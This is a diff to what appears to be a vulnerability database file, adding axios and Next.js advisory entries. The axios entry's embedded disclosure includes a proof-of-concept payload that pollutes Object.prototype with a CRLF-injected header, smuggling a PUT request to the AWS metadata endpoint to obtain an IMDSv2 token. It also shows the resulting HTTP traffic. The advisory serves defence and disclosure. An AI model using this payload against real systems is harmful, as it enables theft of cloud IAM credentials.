@@ -7672,6 +7672,29 @@
             "https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2",
             "https://github.com/axios/axios/releases/tag/v1.15.0"
           ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "1.15.0",
+          "severity": "critical",
+          "cwe": [
+            "CWE-113",
+            "CWE-444",
+            "CWE-918"
+          ],
+          "identifiers": {
+            "summary": "# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific \"Gadget\" attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).\n\nWhile Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.\n\n**Severity**: Critical (CVSS 9.9)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)\n\n## Usage of \"Helper\" Vulnerabilities\nThis vulnerability is unique because it requires **Zero Direct User Input**.\nIf an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.\n\nBecause Axios does not sanitise these merged header values for CRLF (`\\r\\n`) characters, the polluted property becomes a **Request Smuggling** payload.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n```javascript\nObject.prototype['x-amz-target'] = \"dummy\\r\\n\\r\\nPUT /latest/api/token HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\nGET /ignore\";\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application makes a completely safe, hardcoded request:\n```javascript\n// This looks safe to the developer\nawait axios.get('https://analytics.internal/pings'); \n```\n\n### 3. The Execution\nAxios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n```http\nGET /pings HTTP/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT /latest/api/token HTTP/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET /ignore HTTP/1.1\n...\n```\n\n### 4. The Impact (IMDSv2 Bypass)\nThe \"Smuggled\" second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).\nThe Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.\n\n## Impact Analysis\n-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).\n-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.\n-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.\n\n## Recommended Fix\nValidate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the underlying request function.\n\n**Patch Suggestion:**\n```javascript\n// In lib/adapters/http.js\nutils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (/[\\r\\n]/.test(val)) {\n    throw new Error('Security: Header value contains invalid characters');\n  }\n  // ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\nThis report was generated as part of a security audit of the Axios library.",
+            "githubID": "GHSA-fvcv-3m26-pcqx",
+            "CVE": [
+              "CVE-2026-40175"
+            ]
+          },
+          "info": [
+            "https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx",
+            "https://github.com/axios/axios/pull/10660",
+            "https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1",
+            "https://github.com/axios/axios/releases/tag/v1.15.0"
+          ]
         }
       ],
       "extractors": {
@@ -10001,6 +10024,22 @@
           ]
         },
         {
+          "atOrAbove": "13.0.0",
+          "below": "15.5.15",
+          "severity": "high",
+          "cwe": [
+            "CWE-770"
+          ],
+          "identifiers": {
+            "summary": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+            "githubID": "GHSA-q4gf-8mx6-v5v3"
+          },
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3",
+            "https://vercel.com/changelog/summary-of-cve-2026-23869"
+          ]
+        },
+        {
           "atOrAbove": "15.6.0-canary.0",
           "below": "15.6.0-canary.59",
           "severity": "high",
@@ -10451,6 +10490,22 @@
             "https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx",
             "https://github.com/vercel/next.js/commit/a27a11d78e748a8c7ccfd14b7759ad2b9bf097d8",
             "https://github.com/vercel/next.js/releases/tag/v16.1.7"
+          ]
+        },
+        {
+          "atOrAbove": "16.0.0-beta.0",
+          "below": "16.2.3",
+          "severity": "high",
+          "cwe": [
+            "CWE-770"
+          ],
+          "identifiers": {
+            "summary": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+            "githubID": "GHSA-q4gf-8mx6-v5v3"
+          },
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3",
+            "https://vercel.com/changelog/summary-of-cve-2026-23869"
           ]
         },
         {
